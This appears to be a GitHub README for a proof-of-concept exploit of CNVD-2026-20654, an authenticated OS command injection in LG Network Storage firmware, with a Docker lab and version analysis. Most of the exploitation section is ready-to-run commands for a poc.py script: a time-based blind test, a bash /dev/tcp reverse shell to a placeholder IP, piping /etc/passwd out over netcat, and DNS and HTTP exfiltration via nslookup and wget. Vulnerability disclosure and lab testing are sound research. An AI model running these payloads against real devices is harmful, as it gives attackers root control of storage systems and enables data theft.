# CNVD-2026-20654 LG Network Storage Command Injection Vulnerability

[![Quality](https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection/actions/workflows/quality.yml/badge.svg)](https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection/actions/workflows/quality.yml)
[![Python 3](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/)

[English](README.md) | [中文](README_zh.md)

---

## Overview

This repository contains a comprehensive security research project for **CNVD-2026-20654**, a critical command injection vulnerability in LG Network Storage devices. The vulnerability allows remote attackers to execute arbitrary commands with root privileges.

**CVSS Score: 8.8 (High)**

## Table of Contents

- [Vulnerability Details](#vulnerability-details)
- [Affected Versions](#affected-versions)
- [Proof of Concept](#proof-of-concept)
- [Environment Setup](#environment-setup)
- [Exploitation Methods](#exploitation-methods)
- [Version Analysis](#version-analysis)
- [Mitigation](#mitigation)
- [Disclaimer](#disclaimer)

## Vulnerability Details

- **Vulnerability ID**: CNVD-2026-20654
- **Vulnerability Type**: OS Command Injection (CWE-78)
- **CVSS Score**: 8.8 (High)
- **Attack Vector**: Network (Remote)
- **Privileges Required**: Low (Valid account required)
- **User Interaction**: None
- **Impact**: Complete system compromise with root privileges

### Vulnerable Code Locations

1. **Line 28** (`share_set_user_info.php`):
   ```php
   $userpasswd = trim(shell_exec("sudo nas-common md5 $userpasswd"));
   ```

2. **Line 78** (`share_set_user_info.php`):
   ```php
   $check = trim(exec("sudo nas-share check_user $userID"));
   ```

## Affected Versions

**Tested Firmware Versions** (All confirmed vulnerable):
- 1.0.0_2407 (2009-12-29)
- 1.0.0_2450 (2010-02-11)
- 1.0.0_2504
- 1.0.0_2557 (2010-09-12)
- 1.0.0_2569 (2010-10-28)

**Analysis Result**: The vulnerable `share_set_user_info.php` is identical in the locally verified 2569 image and the official 2450/2569 packages (SHA-256: `fea1bea6cb88aaad494b9c357f3b12b345b4816c4706799195209e5ef6f29336`).

## Proof of Concept

### Quick Start

```bash
# Clone the repository
git clone https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection.git
cd CNVD-2026-20654-lg-nas-command-injection

# Start the vulnerable environment
cd environment
docker compose up -d

# Run the PoC with a local, read-back proof file
cd ..
python3 poc.py \
  --target http://127.0.0.1:8000 \
  --username admin \
  --password admin \
  --injection-point userid \
  --proof-file /var/www/en/cnvd_rce_proof.txt
```

The proof-file mode is intentionally restricted to loopback targets. It writes a unique marker and the executing UID under the local lab web root, then reads the file back over HTTP. A response such as `uid=0` is direct evidence of root-level command execution.

### PoC Features

- Automatic login functionality
- Multiple exploitation methods
- Support for two injection points
- Proxy issue fixed
- Time-based blind injection
- Loopback-only proof-file mode with automatic read-back verification
- Non-blind HTTP 200 responses are not treated as RCE confirmation
- Reverse shell support
- DNS/HTTP exfiltration

## Environment Setup

### Prerequisites

- Docker & Docker Compose
- Python 3.9+
- Python dependencies from `requirements.txt`

```bash
python3 -m pip install -r requirements.txt
```

### Docker Environment

```bash
cd environment
docker compose up -d

# Check container status
docker compose ps

# View logs
docker compose logs -f
```

The vulnerable service will be available at `http://localhost:8000`

Default credentials:
- Username: `admin`
- Password: `admin`

## Exploitation Methods

### Method 1: Time-Based Blind Injection (Recommended for verification)

```bash
python3 poc.py \
  --target http://target:8000 \
  --username admin \
  --password admin \
  --injection-point userid \
  --method blind
```

**Result**: Response delay of 5+ seconds confirms vulnerability

### Method 2: File Marker Proof (Local Lab Only)

```bash
python3 poc.py \
  --target http://127.0.0.1:8000 \
  --username admin \
  --password admin \
  --injection-point userid \
  --proof-file /var/www/en/cnvd_rce_proof.txt
```

The PoC generates a unique marker, writes it through the vulnerable path, and verifies it over HTTP. The output includes the marker and `uid=0` when the command runs with root privileges. Do not use `--proof-file` against public or non-loopback targets.

### Method 3: Reverse Shell (Authorized Testing Only)

```bash
# On your server (listening)
nc -l 4444

# Execute PoC
python3 poc.py \
  --target http://target:8000 \
  --username admin \
  --password admin \
  --command "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
```

### Method 4: Data Exfiltration via Reverse Shell

```bash
# On your server
nc -l 4444 > output.txt

# Execute PoC
python3 poc.py \
  --target http://target:8000 \
  --username admin \
  --password admin \
  --command "cat /etc/passwd | nc YOUR_IP 4444"
```

### Method 5: DNS/HTTP Exfiltration

```bash
# DNS exfiltration
python3 poc.py \
  --target http://target:8000 \
  --username admin \
  --password admin \
  --command "nslookup \$(whoami).your-domain.com"

# HTTP exfiltration
python3 poc.py \
  --target http://target:8000 \
  --username admin \
  --password admin \
  --command "wget --post-data=\$(whoami) http://your-server/collect"
```

## Version Analysis

We tested **5 firmware versions** spanning **10 months** (2009-12 to 2010-10):

| Version | Release Date | Vulnerable Code | Local Proof |
|---------|--------------|-----------------|-------------|
| 2407 | 2009-12-29 | Vulnerable | Not run in current lab |
| 2450 | 2010-02-11 | Same verified source | Package comparison |
| 2504 | Unknown | Vulnerable | Not run in current lab |
| 2557 | 2010-09-12 | Vulnerable | Not run in current lab |
| 2569 | 2010-10-28 | Same verified source | Root marker read-back |

**Key Findings**:
- The locally verified 2450 and 2569 packages contain the same vulnerable source file
- Time-based blind injection is useful when command output is not returned
- The local 2569 lab confirms file creation and `uid=0` through the proof-file mode
- An application response such as `ok:ID_conflict` is not command output

## Verification Results

| Test | Status | Evidence |
|------|--------|----------|
| Command Injection | Confirmed in local 2569 lab | Unique marker read back |
| Execution Privilege | Root (UID 0) | Proof file contains `uid=0` |
| Time-Based Blind | Success | About 5 seconds delay |
| Direct command output | Not returned | Endpoint returns application status |
| HTTP 200 alone | Insufficient | PoC reports unconfirmed |

## Mitigation

1. **Upgrade firmware** to the latest patched version
2. **Restrict network access** to the web interface
3. **Implement input validation** and sanitization
4. **Use a Web Application Firewall (WAF)**
5. **Monitor for suspicious activities**

## Disclaimer

This project is for **educational and security research purposes only**. 

- Only test on systems you own or have explicit permission to test
- Use `--proof-file` only with the local loopback lab
- The authors are not responsible for any misuse or damage
- Use this information responsibly and ethically

## References

- CNVD: https://www.cnvd.org.cn/flaw/show/CNVD-2026-20654
- CWE-78: OS Command Injection
- CVSS v3.1 Calculator

## Author

- GitHub: [@bx33661](https://github.com/bx33661)
- Project: [CNVD-2026-20654-lg-nas-command-injection](https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection)

## License

This project is provided for educational purposes. Please use responsibly.

---

**If you find this research helpful, please consider giving it a star!**
